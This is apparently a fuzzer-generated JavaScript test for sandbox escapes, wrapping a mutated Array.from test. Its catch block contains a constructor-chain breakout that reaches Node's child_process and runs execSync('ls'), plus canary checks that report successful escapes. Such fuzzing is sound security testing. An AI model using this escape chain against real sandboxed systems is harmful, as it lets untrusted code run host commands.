try {
    var array = [
        Number.MAX_VALUE,
        Number.MIN_VALUE,
        Number.NaN,
        Number.NEGATIVE_INFINITY,
        Number.POSITIVE_INFINITY
    ];
    var arrayIndex = -1;
    function mapFn(value, index) {
        throw () => {
            return () => {
            };
        };
        this.arrayIndex++;
        assert.sameValue(value, array[this.arrayIndex], 'Value mismatch in mapFn at index ' + index + '.');
        assert.sameValue(index, this.arrayIndex, 'Index mismatch in mapFn.');
        return value;
    }
    var a = Array.from(array, mapFn, this);
    assert.sameValue(a.length, array.length, 'Length mismatch.');
    assert.sameValue(a[0], Number.MAX_VALUE, 'Element mismatch for mapped array at index 0.');
    assert.sameValue(a[1], Number.MIN_VALUE, 'Element mismatch for mapped array at index 1.');
    assert.sameValue(a[2], Number.NaN, 'Element mismatch for mapped array at index 2.');
    assert.sameValue(a[3], Number.NEGATIVE_INFINITY, 'Element mismatch for mapped array at index 3.');
    assert.sameValue(a[4], Number.POSITIVE_INFINITY, 'Element mismatch for mapped array at index 4.');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}